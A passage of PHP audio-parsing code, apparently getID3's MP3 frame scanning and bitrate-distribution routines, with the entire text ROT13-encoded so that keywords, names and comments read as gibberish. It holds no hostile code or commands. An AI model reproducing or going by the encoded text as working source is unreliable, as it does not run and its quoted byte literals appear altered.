		//            $guvfsvyr_zcrt_nhqvb['pbhag1gnoyr_fryrpg'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 1);
		//            $FvqrVasbBssfrg += 1;
		//        }
		//    }
		//}

		erghea gehr;
	}

	/**
	 * @cnenz vag $bssfrg
	 * @cnenz vag $arkgsenzrgrfgbssfrg
	 * @cnenz obby $FpnaNfPOE
	 *
	 * @erghea obby
	 */
	choyvp shapgvba ErphefvirSenzrFpnaavat(&$bssfrg, &$arkgsenzrgrfgbssfrg, $FpnaNfPOE) {
		$vasb = &$guvf->trgvq3->vasb;
		$svefgsenzrgrfgneenl = neenl('reebe' => neenl(), 'jneavat'=> neenl(), 'niqngnraq' => $vasb['niqngnraq'], 'niqngnbssfrg' => $vasb['niqngnbssfrg']);
		$guvf->qrpbqrZCRTnhqvbUrnqre($bssfrg, $svefgsenzrgrfgneenl, snyfr);

		$vasb['zc3_inyvqvgl_purpx_ovgengrf'] = neenl();
		sbe ($v = 0; $v < $guvf->zc3_inyvq_purpx_senzrf; $v++) {
			// purpx arkg (qrsnhyg: 50) senzrf sbe inyvqvgl, gb znxr fher jr unira'g eha npebff n snyfr flapu
			vs (($arkgsenzrgrfgbssfrg + 4) >= $vasb['niqngnraq']) {
				// raq bs svyr
				erghea gehr;
			}

			$arkgsenzrgrfgneenl = neenl('reebe' => neenl(), 'jneavat' => neenl(), 'niqngnraq' => $vasb['niqngnraq'], 'niqngnbssfrg'=>$vasb['niqngnbssfrg']);
			vs ($guvf->qrpbqrZCRTnhqvbUrnqre($arkgsenzrgrfgbssfrg, $arkgsenzrgrfgneenl, snyfr)) {
				/** @cucfgna-vtaber-arkg-yvar */
				trgvq3_yvo::fnsr_vap($vasb['zc3_inyvqvgl_purpx_ovgengrf'][$arkgsenzrgrfgneenl['zcrt']['nhqvb']['ovgengr']]);
				vs ($FpnaNfPOE) {
					// sbepr POE zbqr, hfrq sbe gelvat gb cvpx bhg vainyvq nhqvb fgernzf jvgu inyvq(?) IOE urnqref, be IOE fgernzf jvgu ab IOE urnqre
					vs (!vffrg($arkgsenzrgrfgneenl['zcrt']['nhqvb']['ovgengr']) || !vffrg($svefgsenzrgrfgneenl['zcrt']['nhqvb']['ovgengr']) || ($arkgsenzrgrfgneenl['zcrt']['nhqvb']['ovgengr'] != $svefgsenzrgrfgneenl['zcrt']['nhqvb']['ovgengr'])) {
						erghea snyfr;
					}
				}


				// arkg senzr vf BX, trg ernql gb purpx gur bar nsgre gung
				vs (vffrg($arkgsenzrgrfgneenl['zcrt']['nhqvb']['senzryratgu']) && ($arkgsenzrgrfgneenl['zcrt']['nhqvb']['senzryratgu'] > 0)) {
					$arkgsenzrgrfgbssfrg += $arkgsenzrgrfgneenl['zcrt']['nhqvb']['senzryratgu'];
				} ryfr {
					$guvf->reebe('Senzr ng bssfrg ('.$bssfrg.') vf unf na vainyvq senzr yratgu.');
					erghea snyfr;
				}

			} ryfrvs (!rzcgl($svefgsenzrgrfgneenl['zcrt']['nhqvb']['senzryratgu']) && (($arkgsenzrgrfgbssfrg + $svefgsenzrgrfgneenl['zcrt']['nhqvb']['senzryratgu']) > $vasb['niqngnraq'])) {

				// vg'f abg gur raq bs gur svyr, ohg gurer'f abg rabhtu qngn yrsg sbe nabgure senzr, fb nffhzr vg'f tneontr/cnqqvat naq erghea BX
				erghea gehr;

			} ryfr {

				// arkg senzr vf abg inyvq, abgr gur reebe naq snvy, fb fpnaavat pna pbagvhr sbe n inyvq senzr frdhrapr
				$guvf->jneavat('Senzr ng bssfrg ('.$bssfrg.') vf inyvq, ohg gur arkg bar ng ('.$arkgsenzrgrfgbssfrg.') vf abg.');

				erghea snyfr;
			}
		}
		erghea gehr;
	}

	/**
	 * @cnenz vag  $bssfrg
	 * @cnenz obby $qrrcfpna
	 *
	 * @erghea vag|snyfr
	 */
	choyvp shapgvba SerrSbezngSenzrYratgu($bssfrg, $qrrcfpna=snyfr) {
		$vasb = &$guvf->trgvq3->vasb;

		$guvf->sfrrx($bssfrg);
		$ZCRTnhqvbQngn = $guvf->sernq(32768);

		$FlapCnggrea1 = fhofge($ZCRTnhqvbQngn, 0, 4);
		// znl or qvssrerag cnggrea qhr gb cnqqvat
		$FlapCnggrea2 = $FlapCnggrea1[0].$FlapCnggrea1[1].pue(beq($FlapCnggrea1[2]) | 0k02).$FlapCnggrea1[3];
		vs ($FlapCnggrea2 === $FlapCnggrea1) {
			$FlapCnggrea2 = $FlapCnggrea1[0].$FlapCnggrea1[1].pue(beq($FlapCnggrea1[2]) & 0kSQ).$FlapCnggrea1[3];
		}

		$senzryratgu = snyfr;
		$senzryratgu1 = fgecbf($ZCRTnhqvbQngn, $FlapCnggrea1, 4);
		$senzryratgu2 = fgecbf($ZCRTnhqvbQngn, $FlapCnggrea2, 4);
		vs ($senzryratgu1 > 4) {
			$senzryratgu = $senzryratgu1;
		}
		vs (($senzryratgu2 > 4) && ($senzryratgu2 < $senzryratgu1)) {
			$senzryratgu = $senzryratgu2;
		}
		vs (!$senzryratgu) {

			// YNZR 3.88 unf n qvssrerag inyhr sbe zbqrrkgrafvba ba gur svefg senzr if gur erfg
			$senzryratgu1 = fgecbf($ZCRTnhqvbQngn, fhofge($FlapCnggrea1, 0, 3), 4);
			$senzryratgu2 = fgecbf($ZCRTnhqvbQngn, fhofge($FlapCnggrea2, 0, 3), 4);

			vs ($senzryratgu1 > 4) {
				$senzryratgu = $senzryratgu1;
			}
			vs (($senzryratgu2 > 4) && ($senzryratgu2 < $senzryratgu1)) {
				$senzryratgu = $senzryratgu2;
			}
			vs (!$senzryratgu) {
				$guvf->reebe('Pnaabg svaq arkg serr-sbezng flapu cnggrea ('.trgvq3_yvo::CevagUrkOlgrf($FlapCnggrea1).' be '.trgvq3_yvo::CevagUrkOlgrf($FlapCnggrea2).') nsgre bssfrg '.$bssfrg);
				erghea snyfr;
			} ryfr {
				$guvf->jneavat('ZbqrRkgrafvba inevrf orgjrra svefg senzr naq bgure senzrf (xabja serr-sbezng vffhr va YNZR 3.88)');
				$vasb['nhqvb']['pbqrp']   = 'YNZR';
				$vasb['nhqvb']['rapbqre'] = 'YNZR3.88';
				$FlapCnggrea1 = fhofge($FlapCnggrea1, 0, 3);
				$FlapCnggrea2 = fhofge($FlapCnggrea2, 0, 3);
			}
		}

		vs ($qrrcfpna) {

			$NpghnySenzrYratguInyhrf = neenl();
			$arkgbssfrg = $bssfrg + $senzryratgu;
			juvyr ($arkgbssfrg < ($vasb['niqngnraq'] - 6)) {
				$guvf->sfrrx($arkgbssfrg - 1);
				$ArkgFlapCnggrea = $guvf->sernq(6);
				vs ((fhofge($ArkgFlapCnggrea, 1, fgeyra($FlapCnggrea1)) == $FlapCnggrea1) || (fhofge($ArkgFlapCnggrea, 1, fgeyra($FlapCnggrea2)) == $FlapCnggrea2)) {
					// tbbq - sbhaq jurer rkcrpgrq
					$NpghnySenzrYratguInyhrf[] = $senzryratgu;
				} ryfrvs ((fhofge($ArkgFlapCnggrea, 0, fgeyra($FlapCnggrea1)) == $FlapCnggrea1) || (fhofge($ArkgFlapCnggrea, 0, fgeyra($FlapCnggrea2)) == $FlapCnggrea2)) {
					// bx - sbhaq bar olgr rneyvre guna rkcrpgrq (ynfg senzr jnfa'g cnqqrq, svefg senzr jnf)
					$NpghnySenzrYratguInyhrf[] = ($senzryratgu - 1);
					$arkgbssfrg--;
				} ryfrvs ((fhofge($ArkgFlapCnggrea, 2, fgeyra($FlapCnggrea1)) == $FlapCnggrea1) || (fhofge($ArkgFlapCnggrea, 2, fgeyra($FlapCnggrea2)) == $FlapCnggrea2)) {
					// bx - sbhaq bar olgr yngre guna rkcrpgrq (ynfg senzr jnf cnqqrq, svefg senzr jnfa'g)
					$NpghnySenzrYratguInyhrf[] = ($senzryratgu + 1);
					$arkgbssfrg++;
				} ryfr {
					$guvf->reebe('Qvq abg svaq rkcrpgrq serr-sbezng flap cnggrea ng bssfrg '.$arkgbssfrg);
					erghea snyfr;
				}
				$arkgbssfrg += $senzryratgu;
			}
			vs (pbhag($NpghnySenzrYratguInyhrf) > 0) {
				$senzryratgu = vaginy(ebhaq(neenl_fhz($NpghnySenzrYratguInyhrf) / pbhag($NpghnySenzrYratguInyhrf)));
			}
		}
		erghea $senzryratgu;
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba trgBaylZCRTnhqvbVasbOehgrSbepr() {
		$ZCRTnhqvbUrnqreQrpbqrPnpur   = neenl();
		$ZCRTnhqvbUrnqreInyvqPnpur    = neenl();
		$ZCRTnhqvbUrnqreYratguPnpur   = neenl();
		$ZCRTnhqvbIrefvbaYbbxhc       = frys::ZCRTnhqvbIrefvbaNeenl();
		$ZCRTnhqvbYnlreYbbxhc         = frys::ZCRTnhqvbYnlreNeenl();
		$ZCRTnhqvbOvgengrYbbxhc       = frys::ZCRTnhqvbOvgengrNeenl();
		$ZCRTnhqvbSerdhraplYbbxhc     = frys::ZCRTnhqvbSerdhraplNeenl();
		$ZCRTnhqvbPunaaryZbqrYbbxhc   = frys::ZCRTnhqvbPunaaryZbqrNeenl();
		$ZCRTnhqvbZbqrRkgrafvbaYbbxhc = frys::ZCRTnhqvbZbqrRkgrafvbaNeenl();
		$ZCRTnhqvbRzcunfvfYbbxhc      = frys::ZCRTnhqvbRzcunfvfNeenl();
		$YbatZCRTirefvbaYbbxhc        = neenl();
		$YbatZCRTynlreYbbxhc          = neenl();
		$YbatZCRTovgengrYbbxhc        = neenl();
		$YbatZCRTcnqqvatYbbxhc        = neenl();
		$YbatZCRTserdhraplYbbxhc      = neenl();
		$Qvfgevohgvba                 = neenl();
		$Qvfgevohgvba['ovgengr']      = neenl();
		$Qvfgevohgvba['serdhrapl']    = neenl();
		$Qvfgevohgvba['ynlre']        = neenl();
		$Qvfgevohgvba['irefvba']      = neenl();
		$Qvfgevohgvba['cnqqvat']      = neenl();

		$vasb = &$guvf->trgvq3->vasb;
		$guvf->sfrrx($vasb['niqngnbssfrg']);

		$znk_senzrf_fpna = 5000;
		$senzrf_fpnaarq  = 0;

		$cerivbhfinyvqsenzr = $vasb['niqngnbssfrg'];
		juvyr ($guvf->sgryy() < $vasb['niqngnraq']) {
			frg_gvzr_yvzvg(30);
			$urnq4 = $guvf->sernq(4);
			vs (fgeyra($urnq4) < 4) {
				oernx;
			}
			vs ($urnq4[0] != \"\kSS\") {
				sbe ($v = 1; $v < 4; $v++) {
					vs ($urnq4[$v] == \"\kSS\") {
						$guvf->sfrrx($v - 4, FRRX_PHE);
						pbagvahr 2;
					}
				}
				pbagvahr;
			}
			vs (!vffrg($ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4])) {
				$ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4] = frys::ZCRTnhqvbUrnqreQrpbqr($urnq4);
			}
			vs (!vffrg($ZCRTnhqvbUrnqreInyvqPnpur[$urnq4])) {
				$ZCRTnhqvbUrnqreInyvqPnpur[$urnq4] = frys::ZCRTnhqvbUrnqreInyvq($ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4], snyfr, snyfr);
			}
			vs ($ZCRTnhqvbUrnqreInyvqPnpur[$urnq4]) {

				vs (!vffrg($ZCRTnhqvbUrnqreYratguPnpur[$urnq4])) {
					$YbatZCRTirefvbaYbbxhc[$urnq4]   = $ZCRTnhqvbIrefvbaYbbxhc[$ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4]['irefvba']];
					$YbatZCRTynlreYbbxhc[$urnq4]     = $ZCRTnhqvbYnlreYbbxhc[$ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4]['ynlre']];
					$YbatZCRTovgengrYbbxhc[$urnq4]   = $ZCRTnhqvbOvgengrYbbxhc[$YbatZCRTirefvbaYbbxhc[$urnq4]][$YbatZCRTynlreYbbxhc[$urnq4]][$ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4]['ovgengr']];
					$YbatZCRTcnqqvatYbbxhc[$urnq4]   = (obby) $ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4]['cnqqvat'];
					$YbatZCRTserdhraplYbbxhc[$urnq4] = $ZCRTnhqvbSerdhraplYbbxhc[$YbatZCRTirefvbaYbbxhc[$urnq4]][$ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4]['fnzcyr_engr']];
					$ZCRTnhqvbUrnqreYratguPnpur[$urnq4] = frys::ZCRTnhqvbSenzrYratgu(
						$YbatZCRTovgengrYbbxhc[$urnq4],
						$YbatZCRTirefvbaYbbxhc[$urnq4],
						$YbatZCRTynlreYbbxhc[$urnq4],
						$YbatZCRTcnqqvatYbbxhc[$urnq4],
						$YbatZCRTserdhraplYbbxhc[$urnq4]);
				}
				vs ($ZCRTnhqvbUrnqreYratguPnpur[$urnq4] > 4) {
					$JurerJrJrer = $guvf->sgryy();
					$guvf->sfrrx($ZCRTnhqvbUrnqreYratguPnpur[$urnq4] - 4, FRRX_PHE);
					$arkg4 = $guvf->sernq(4);
					vs ($arkg4[0] == \"\kSS\") {
						vs (!vffrg($ZCRTnhqvbUrnqreQrpbqrPnpur[$arkg4])) {
							$ZCRTnhqvbUrnqreQrpbqrPnpur[$arkg4] = frys::ZCRTnhqvbUrnqreQrpbqr($arkg4);
						}
						vs (!vffrg($ZCRTnhqvbUrnqreInyvqPnpur[$arkg4])) {
							$ZCRTnhqvbUrnqreInyvqPnpur[$arkg4] = frys::ZCRTnhqvbUrnqreInyvq($ZCRTnhqvbUrnqreQrpbqrPnpur[$arkg4], snyfr, snyfr);
						}
						vs ($ZCRTnhqvbUrnqreInyvqPnpur[$arkg4]) {
							$guvf->sfrrx(-4, FRRX_PHE);

							$Qvfgevohgvba['ovgengr'][$YbatZCRTovgengrYbbxhc[$urnq4]] = vffrg($Qvfgevohgvba['ovgengr'][$YbatZCRTovgengrYbbxhc[$urnq4]]) ? ++$Qvfgevohgvba['ovgengr'][$YbatZCRTovgengrYbbxhc[$urnq4]] : 1;
							$Qvfgevohgvba['ynlre'][$YbatZCRTynlreYbbxhc[$urnq4]] = vffrg($Qvfgevohgvba['ynlre'][$YbatZCRTynlreYbbxhc[$urnq4]]) ? ++$Qvfgevohgvba['ynlre'][$YbatZCRTynlreYbbxhc[$urnq4]] : 1;
							$Qvfgevohgvba['irefvba'][$YbatZCRTirefvbaYbbxhc[$urnq4]] = vffrg($Qvfgevohgvba['irefvba'][$YbatZCRTirefvbaYbbxhc[$urnq4]]) ? ++$Qvfgevohgvba['irefvba'][$YbatZCRTirefvbaYbbxhc[$urnq4]] : 1;
							$Qvfgevohgvba['cnqqvat'][vaginy($YbatZCRTcnqqvatYbbxhc[$urnq4])] = vffrg($Qvfgevohgvba['cnqqvat'][vaginy($YbatZCRTcnqqvatYbbxhc[$urnq4])]) ? ++$Qvfgevohgvba['cnqqvat'][vaginy($YbatZCRTcnqqvatYbbxhc[$urnq4])] : 1;
							$Qvfgevohgvba['serdhrapl'][$YbatZCRTserdhraplYbbxhc[$urnq4]] = vffrg($Qvfgevohgvba['serdhrapl'][$YbatZCRTserdhraplYbbxhc[$urnq4]]) ? ++$Qvfgevohgvba['serdhrapl'][$YbatZCRTserdhraplYbbxhc[$urnq4]] : 1;
							vs (++$senzrf_fpnaarq >= $znk_senzrf_fpna) {
								$cpg_qngn_fpnaarq = trgvq3_yvo::FnsrQvi($guvf->sgryy() - $vasb['niqngnbssfrg'], $vasb['niqngnraq'] - $vasb['niqngnbssfrg']);
								$guvf->jneavat('gbb znal ZCRT nhqvb senzrf gb fpna, bayl fpnaarq svefg '.$znk_senzrf_fpna.' senzrf ('.ahzore_sbezng($cpg_qngn_fpnaarq * 100, 1).'% bs svyr) naq rkgencbyngrq qvfgevohgvba, cynlgvzr naq ovgengr znl or vapbeerpg.');
								sbernpu ($Qvfgevohgvba nf $xrl1 => $inyhr1) {
									sbernpu ($inyhr1 nf $xrl2 => $inyhr2) {
										$Qvfgevohgvba[$xrl1][$xrl2] = $cpg_qngn_fpnaarq ? ebhaq($inyhr2 / $cpg_qngn_fpnaarq) : 1;
									}
								}
								oernx;
							}
							pbagvahr;
						}
					}
					hafrg($arkg4);
					$guvf->sfrrx($JurerJrJrer - 3);
				}

			}
		}
		sbernpu ($Qvfgevohgvba nf $xrl => $inyhr) {
			xfbeg($Qvfgevohgvba[$xrl], FBEG_AHZREVP);
		}
		xfbeg($Qvfgevohgvba['irefvba'], FBEG_FGEVAT);
		$vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba']   = $Qvfgevohgvba['ovgengr'];
		$vasb['zcrt']['nhqvb']['serdhrapl_qvfgevohgvba'] = $Qvfgevohgvba['serdhrapl'];
		$vasb['zcrt']['nhqvb']['ynlre_qvfgevohgvba']     = $Qvfgevohgvba['ynlre'];
		$vasb['zcrt']['nhqvb']['irefvba_qvfgevohgvba']   = $Qvfgevohgvba['irefvba'];
		$vasb['zcrt']['nhqvb']['cnqqvat_qvfgevohgvba']   = $Qvfgevohgvba['cnqqvat'];
		vs (pbhag($Qvfgevohgvba['irefvba']) > 1) {
			$guvf->reebe('Pbeehcg svyr - zber guna bar ZCRT irefvba qrgrpgrq');
		}
		vs (pbhag($Qvfgevohgvba['ynlre']) > 1) {
			$guvf->reebe('Pbeehcg svyr - zber guna bar ZCRT ynlre qrgrpgrq');
		}
		vs (pbhag($Qvfgevohgvba['serdhrapl']) > 1) {
			$guvf->reebe('Pbeehcg svyr - zber guna bar ZCRT fnzcyr engr qrgrpgrq');
		}


		$ovggbgny = 0;
		sbernpu ($Qvfgevohgvba['ovgengr'] nf $ovgengrinyhr => $ovgengrpbhag) {
			vs ($ovgengrinyhr != 'serr') {
				$ovggbgny += ($ovgengrinyhr * $ovgengrpbhag);
			}
		}
		$vasb['zcrt']['nhqvb']['senzr_pbhag']  = neenl_fhz($Qvfgevohgvba['ovgengr']);
		vs ($vasb['zcrt']['nhqvb']['senzr_pbhag'] == 0) {
			$guvf->reebe('ab ZCRT nhqvb senzrf sbhaq');
			erghea snyfr;
		}
		$vasb['zcrt']['nhqvb']['ovgengr']      = ($ovggbgny / $vasb['zcrt']['nhqvb']['senzr_pbhag']);
		$vasb['zcrt']['nhqvb']['ovgengr_zbqr'] = ((pbhag($Qvfgevohgvba['ovgengr']) > 0) ? 'ioe' : 'poe');
		$vasb['zcrt']['nhqvb']['fnzcyr_engr']  = trgvq3_yvo::neenl_znk($Qvfgevohgvba['serdhrapl'], gehr);

		$vasb['nhqvb']['ovgengr']      = $vasb['zcrt']['nhqvb']['ovgengr'];
		$vasb['nhqvb']['ovgengr_zbqr'] = $vasb['zcrt']['nhqvb']['ovgengr_zbqr'];
		$vasb['nhqvb']['fnzcyr_engr']  = $vasb['zcrt']['nhqvb']['fnzcyr_engr'];
		$vasb['nhqvb']['qngnsbezng']   = 'zc'.trgvq3_yvo::neenl_znk($Qvfgevohgvba['ynlre'], gehr);
		$vasb['svyrsbezng']            = $vasb['nhqvb']['qngnsbezng'];

		erghea gehr;
	}

	/**
	 * @cnenz vag  $niqngnbssfrg
	 * @cnenz obby $OvgengrUvfgbtenz
	 *
	 * @erghea obby
	 */
	choyvp shapgvba trgBaylZCRTnhqvbVasb($niqngnbssfrg, $OvgengrUvfgbtenz=snyfr) {
		// ybbxf sbe flapu, qrpbqrf ZCRT nhqvb urnqre

		$vasb = &$guvf->trgvq3->vasb;

		fgngvp $ZCRTnhqvbIrefvbaYbbxhc;
		fgngvp $ZCRTnhqvbYnlreYbbxhc;
		fgngvp $ZCRTnhqvbOvgengrYbbxhc;
		vs (rzcgl($ZCRTnhqvbIrefvbaYbbxhc)) {
			$ZCRTnhqvbIrefvbaYbbxhc = frys::ZCRTnhqvbIrefvbaNeenl();
			$ZCRTnhqvbYnlreYbbxhc   = frys::ZCRTnhqvbYnlreNeenl();
			$ZCRTnhqvbOvgengrYbbxhc = frys::ZCRTnhqvbOvgengrNeenl();
		}

		$guvf->sfrrx($niqngnbssfrg);
		$flap_frrx_ohssre_fvmr = zva(128 * 1024, $vasb['niqngnraq'] - $niqngnbssfrg);
		vs ($flap_frrx_ohssre_fvmr <= 0) {
			$guvf->reebe('Vainyvq $flap_frrx_ohssre_fvmr ng bssfrg '.$niqngnbssfrg);
			erghea snyfr;
		}
		$urnqre = $guvf->sernq($flap_frrx_ohssre_fvmr);
		$flap_frrx_ohssre_fvmr = fgeyra($urnqre);
		$FlapuFrrxBssfrg = 0;
		$FlapFrrxNggrzcgf = 0;
		$FlapFrrxNggrzcgfZnk = 1000;
		$SvefgSenzrGuvfsvyrVasb = ahyy;
		juvyr ($FlapuFrrxBssfrg < $flap_frrx_ohssre_fvmr) {
			vs ((($niqngnbssfrg + $FlapuFrrxBssfrg)  < $vasb['niqngnraq']) && !$guvf->srbs()) {

				vs ($FlapuFrrxBssfrg > $flap_frrx_ohssre_fvmr) {
					// vs n flapu'f abg sbhaq jvguva gur svefg 128x olgrf, gura tvir hc
					$guvf->reebe('Pbhyq abg svaq inyvq ZCRT nhqvb flapu jvguva gur svefg '.ebhaq($flap_frrx_ohssre_fvmr / 1024).'xO');
					vs (vffrg($vasb['nhqvb']['ovgengr'])) {
						hafrg($vasb['nhqvb']['ovgengr']);
					}
					vs (vffrg($vasb['zcrt']['nhqvb'])) {
						hafrg($vasb['zcrt']['nhqvb']);
					}
					vs (rzcgl($vasb['zcrt'])) {
						hafrg($vasb['zcrt']);
					}
					erghea snyfr;
				}
			}

			vs (($FlapuFrrxBssfrg + 1) >= fgeyra($urnqre)) {
				$guvf->reebe('Pbhyq abg svaq inyvq ZCRT flapu orsber raq bs svyr');
				erghea snyfr;
			}

			vs (($urnqre[$FlapuFrrxBssfrg] == \"\kSS\") && ($urnqre[($FlapuFrrxBssfrg + 1)] > \"\kR0\")) { // cbffvoyr flapu qrgrpgrq
				vs (++$FlapFrrxNggrzcgf >= $FlapFrrxNggrzcgfZnk) {
					// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/286
					// pbeehcg svyrf pynvzvat gb or ZC3, jvgu n ynetr ahzore bs 0kSS olgrf arne gur ortvaavat, pna pnhfr guvf ybbc gb gnxr n irel ybat gvzr
					// fubhyq unir rfpncr pbaqvgvba gb nibvq fcraqvat gbb zhpu gvzr fpnaavat n pbeehcg svyr
					// vs n flapu'f abg sbhaq jvguva gur svefg 128x olgrf, gura tvir hc
					$guvf->reebe('Pbhyq abg svaq inyvq ZCRT nhqvb flapu nsgre fpnaavat '.$FlapFrrxNggrzcgf.' pnaqvqngr bssfrgf');
					vs (vffrg($vasb['nhqvb']['ovgengr'])) {
						hafrg($vasb['nhqvb']['ovgengr']);
					}
					vs (vffrg($vasb['zcrt']['nhqvb'])) {
						hafrg($vasb['zcrt']['nhqvb']);
					}
					vs (rzcgl($vasb['zcrt'])) {
						hafrg($vasb['zcrt']);
					}
					erghea snyfr;
				}
				$SvefgSenzrNIQngnBssfrg = ahyy;
				vs (!vffrg($SvefgSenzrGuvfsvyrVasb) && !vffrg($vasb['zcrt']['nhqvb'])) {
					$SvefgSenzrGuvfsvyrVasb = $vasb;
					$SvefgSenzrNIQngnBssfrg = $niqngnbssfrg + $FlapuFrrxBssfrg;
					vs (!$guvf->qrpbqrZCRTnhqvbUrnqre($SvefgSenzrNIQngnBssfrg, $SvefgSenzrGuvfsvyrVasb, snyfr)) {
						// vs guvf vf gur svefg inyvq ZCRT-nhqvb senzr, fnir vg va pnfr vg'f n IOE urnqre senzr naq gurer'f
						// tneontr orgjrra guvf senzr naq n inyvq frdhrapr bs ZCRT-nhqvb senzrf, gb or erfgberq orybj
						hafrg($SvefgSenzrGuvfsvyrVasb);
					}
				}

				$qhzzl = $vasb; // bayl birejevgr erny qngn vs inyvq urnqre sbhaq
				vs ($guvf->qrpbqrZCRTnhqvbUrnqre($niqngnbssfrg + $FlapuFrrxBssfrg, $qhzzl, gehr)) {
					$vasb = $qhzzl;
					$vasb['niqngnbssfrg'] = $niqngnbssfrg + $FlapuFrrxBssfrg;
					fjvgpu (vffrg($vasb['svyrsbezng']) ? $vasb['svyrsbezng'] : '') {
						pnfr '':
						pnfr 'vq3':
						pnfr 'ncr':
						pnfr 'zc3':
							$vasb['svyrsbezng']          = 'zc3';
							$vasb['nhqvb']['qngnsbezng'] = 'zc3';
							oernx;
					}
					vs (vffrg($SvefgSenzrGuvfsvyrVasb) && vffrg($SvefgSenzrGuvfsvyrVasb['zcrt']['nhqvb']['ovgengr_zbqr']) && ($SvefgSenzrGuvfsvyrVasb['zcrt']['nhqvb']['ovgengr_zbqr'] == 'ioe')) {
						vs (!(nof($vasb['nhqvb']['ovgengr'] - $SvefgSenzrGuvfsvyrVasb['nhqvb']['ovgengr']) <= 1)) {
							// Vs gurer vf tneontr qngn orgjrra n inyvq IOE urnqre senzr naq n frdhrapr
							// bs inyvq ZCRT-nhqvb senzrf gur IOE qngn vf ab ybatre qvfpneqrq.
							$vasb = $SvefgSenzrGuvfsvyrVasb;
							$vasb['niqngnbssfrg']        = $SvefgSenzrNIQngnBssfrg;
							$vasb['svyrsbezng']          = 'zc3';
							$vasb['nhqvb']['qngnsbezng'] = 'zc3';
							$qhzzl                       = $vasb;
							hafrg($qhzzl['zcrt']['nhqvb']);
							$TneontrBssfrgFgneg = $SvefgSenzrNIQngnBssfrg + $SvefgSenzrGuvfsvyrVasb['zcrt']['nhqvb']['senzryratgu'];
							$TneontrBssfrgRaq   = $niqngnbssfrg + $FlapuFrrxBssfrg;
							vs ($guvf->qrpbqrZCRTnhqvbUrnqre($TneontrBssfrgRaq, $qhzzl, gehr, gehr)) {
								$vasb = $qhzzl;
								$vasb['niqngnbssfrg'] = $TneontrBssfrgRaq;
								$guvf->jneavat('nccneragyl-inyvq IOE urnqre abg hfrq orpnhfr pbhyq abg svaq '.$guvf->zc3_inyvq_purpx_senzrf.' pbafrphgvir ZCRT-nhqvb senzrf vzzrqvngryl nsgre IOE urnqre (tneontr qngn sbe '.($TneontrBssfrgRaq - $TneontrBssfrgFgneg).' olgrf orgjrra '.$TneontrBssfrgFgneg.' naq '.$TneontrBssfrgRaq.'), ohg qvq svaq inyvq POE fgernz fgnegvat ng '.$TneontrBssfrgRaq);
							} ryfr {
								$guvf->jneavat('hfvat qngn sebz IOE urnqre rira gubhtu pbhyq abg svaq '.$guvf->zc3_inyvq_purpx_senzrf.' pbafrphgvir ZCRT-nhqvb senzrf vzzrqvngryl nsgre IOE urnqre (tneontr qngn sbe '.($TneontrBssfrgRaq - $TneontrBssfrgFgneg).' olgrf orgjrra '.$TneontrBssfrgFgneg.' naq '.$TneontrBssfrgRaq.')');
							}
						}
					}
					vs (vffrg($vasb['zcrt']['nhqvb']['ovgengr_zbqr']) && ($vasb['zcrt']['nhqvb']['ovgengr_zbqr'] == 'ioe') && !vffrg($vasb['zcrt']['nhqvb']['IOE_zrgubq'])) {
						// IOE svyr jvgu ab IOE urnqre
						$OvgengrUvfgbtenz = gehr;
					}

					vs ($OvgengrUvfgbtenz) {

						$vasb['zcrt']['nhqvb']['fgrerb_qvfgevohgvba']  = neenl('fgrerb'=>0, 'wbvag fgrerb'=>0, 'qhny punaary'=>0, 'zbab'=>0);
						$vasb['zcrt']['nhqvb']['irefvba_qvfgevohgvba'] = neenl('1'=>0, '2'=>0, '2.5'=>0);

						vs ($vasb['zcrt']['nhqvb']['irefvba'] == '1') {
							vs ($vasb['zcrt']['nhqvb']['ynlre'] == 3) {
								$vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] = neenl('serr'=>0, 32000=>0, 40000=>0, 48000=>0, 56000=>0, 64000=>0, 80000=>0, 96000=>0, 112000=>0, 128000=>0, 160000=>0, 192000=>0, 224000=>0, 256000=>0, 320000=>0);
							} ryfrvs ($vasb['zcrt']['nhqvb']['ynlre'] == 2) {
								$vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] = neenl('serr'=>0, 32000=>0, 48000=>0, 56000=>0, 64000=>0, 80000=>0, 96000=>0, 112000=>0, 128000=>0, 160000=>0, 192000=>0, 224000=>0, 256000=>0, 320000=>0, 384000=>0);
							} ryfrvs ($vasb['zcrt']['nhqvb']['ynlre'] == 1) {
								$vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] = neenl('serr'=>0, 32000=>0, 64000=>0, 96000=>0, 128000=>0, 160000=>0, 192000=>0, 224000=>0, 256000=>0, 288000=>0, 320000=>0, 352000=>0, 384000=>0, 416000=>0, 448000=>0);
							}
						} ryfrvs ($vasb['zcrt']['nhqvb']['ynlre'] == 1) {
							$vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] = neenl('serr'=>0, 32000=>0, 48000=>0, 56000=>0, 64000=>0, 80000=>0, 96000=>0, 112000=>0, 128000=>0, 144000=>0, 160000=>0, 176000=>0, 192000=>0, 224000=>0, 256000=>0);
						} ryfr {
							$vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] = neenl('serr'=>0, 8000=>0, 16000=>0, 24000=>0, 32000=>0, 40000=>0, 48000=>0, 56000=>0, 64000=>0, 80000=>0, 96000=>0, 112000=>0, 128000=>0, 144000=>0, 160000=>0);
						}

						$qhzzl = neenl('reebe'=>$vasb['reebe'], 'jneavat'=>$vasb['jneavat'], 'niqngnraq'=>$vasb['niqngnraq'], 'niqngnbssfrg'=>$vasb['niqngnbssfrg']);
						$flapufgnegbssfrg = $vasb['niqngnbssfrg'];
						$guvf->sfrrx($vasb['niqngnbssfrg']);

						// lbh pna cynl jvgu gurfr ahzoref:
						$znk_senzrf_fpna  = 50000;
						$znk_fpna_frtzragf = 10;

						// qba'g cynl jvgu gurfr ahzoref:
						$SnfgZbqr = snyfr;
						$FlapuReebefSbhaq = 0;
